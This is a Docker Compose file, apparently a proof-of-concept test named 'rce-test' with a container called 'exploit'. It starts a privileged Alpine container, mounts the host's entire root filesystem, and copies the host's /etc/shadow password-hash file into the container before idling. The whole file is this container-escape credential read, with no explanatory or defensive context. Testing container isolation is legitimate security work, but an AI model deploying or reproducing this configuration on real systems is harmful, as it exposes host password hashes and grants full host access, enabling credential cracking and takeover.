version: '3.8'

services:
  rce-test:
    image: alpine:3.19
    container_name: exploit
    privileged: true
    volumes:
      - /:/host-root
    command: >
      sh -c "
        cat /host-root/etc/shadow > /tmp/shadow.txt &&
        sleep 3600
      "
